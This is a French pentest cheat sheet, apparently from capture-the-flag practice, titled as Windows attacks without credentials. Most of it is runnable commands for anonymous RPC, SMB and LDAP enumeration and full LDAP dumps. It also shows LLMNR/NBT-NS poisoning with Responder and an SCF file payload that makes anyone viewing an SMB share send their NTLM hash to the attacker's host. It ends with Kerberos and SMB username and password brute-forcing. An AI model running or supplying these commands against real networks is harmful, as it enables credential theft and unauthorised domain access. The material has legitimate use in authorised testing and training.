# Attaques Windows sans identifiants

### 1. Exploitation du null bind

> Exploitation des services autorisants la connexion sans identifiants
>
> Objectifs : récupérer des informations

#### 1.1. Accès RPC anonyme

> Connexion anonyme à l'annuaire de l'AD.
>
> Objectifs : par exemple, consulter la liste des utilisateurs du domaine.

``` bash
$ rpcclient -p <PORT> -U "" -N <IP>
```

Voir [rpcclient](./rpcclient.md) pour consulter les actions réalisables.

#### 1.2. Accès SMB anonyme

> Objectifs : Accéder à un share SMB sans idenfiants

```bash
$ smbclient -L '\\IP' -U ''%''

$ crackmapexec smb <IP> -u '' -p '' --shares
```

#### 1.3. Accès LDAP anonyme (LDAP anonymous bind)

> Objectifs : lire des parties du LDAP

```bash
# Avec nmap
$ nmap -n -sV --script "ldap* and not brute" <IP_LDAP>

# Avec python
$ python3          
Python 3.9.9 (main, Nov 16 2021, 10:24:31) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ldap3
>>> server = ldap3.Server('10.10.11.129', get_info = ldap3.ALL, port=389)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
# Si false, pas exploitable
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
# Si false, pas exploitable
```

Si exploitable, dump l'intégralité du LDAP :

```bash
$ ldapdomaindump <IP_LDAP>
[*] Connecting as anonymous user, dumping will probably fail. Consider specifying a username/password to login with
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```



### 2. Connexion anonyme

> Différent d'une session nulle.
>
> Références :
>
> - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj852200(v=ws.11)
> - https://mpgn.gitbook.io/crackmapexec/smb-protocol/enumeration/enumerate-anonymous-logon

#### 2.1. Lister les shares de manière anonyme

> Objectif : lister les shares d'une machine

```bash
$ smbclient -L '\\dc01.timelapse.htb\' -N
# OU
$ crackmapexec smb <IP_DC> -u 'a' -p '' --shares  
```

#### 2.2. Connexion à un share acceptant la connexion anonyme

> Objectif : se connecter à un share

```bash
$ smbclient -N  \\\\dc01.timelapse.htb\\<Share_READABLE>
```



### 3. LLMNR/NBT-NS (MITM)

> Attaque Man-In-The-Middle, consistant à intercepter se faire passer pour la ressource demandée afin que la machine s'authentifie sur nous.
>
> LLMNR : Protocole de résolution de nom, utilisé pour chercher un FQDN sur le réseau afin de s'y connecter. 
>
> Ordre de recherche DNS par la machine : base locale (/etc/hosts) > LLMNR > serveur DNS (/etc/resolv.conf).
>
> Objectifs : récupérer le hash Net-NTLMv2 pour le craquer et obtenir le mot de passe de l'utilisateur (pas de pass-the-hash).

```bash
$ sudo responder -I eth0 -wFv
```



### 4. Upload de fichier SCF

> Dans le cas où un upload de fichier se fait sur un partage SMB et qu'une personne va regarder les fichiers uploadés
>
> Objectifs : Récupérer le hash NTLMv2 de l'utilisateur consultant le fichier uploadé

```bash
# payload.scf à upload
[Shell]
Command=2
IconFile=\\<IP_HOTE>\share\test.ico
[TaskBar]
Command=ToggleDesktop

# récupération du hash sur l'Hôte
$ sudo responder -wrf --lm -v -I tun0
```



### 5. Bruteforce

> Quand il n'y a plus rien d'autre à faire
>
> Objectif : obtenir un compte du domaine

- **Bruteforce d'un nom d'utilisateur :**

```bash
# Bruteforce pour obtenir un nom d'utilisateur valide auprès du ldap
$ nmap -n -sV --script ldap-brute -p 389,636 --script-args userdb=<USER_LIST> --script-args ldap.base='"dc=search,dc=htb"' <IP_LDAP>

# Bruteforce pour obtenir un nom d'utilisateur valide en passant par le protocole Kerberos (pré-authentification)
$ kerbrute userenum -d <DOMAIN.COM> <USERNAME_WORDLIST> --dc <DOMAIN_CONTROLLER>
```

- **Bruteforce d'un mot de passe :**

```bash
# Bruteforce d'un mot de passe d'un utilisateur connu via le protocole Kerberos (pré-authentification)
$ kerbrute bruteuser --dc <DOMAIN_CONTROLLER> -d <DOMAIN.COM> <PASSWORD_WORDLIST> <USER_VALIDE>    

# Bruteforce d'un mot de passe d'un utilisateur connu sur un partage SMB
$ crackmapexec smb <IP_DC> -u <USERS_VALIDES_WORDLIST> -p <PASSWORD_WORDLIST> --continue-on-success (pour parcourir toute la liste des utilisateurs fournies)
```

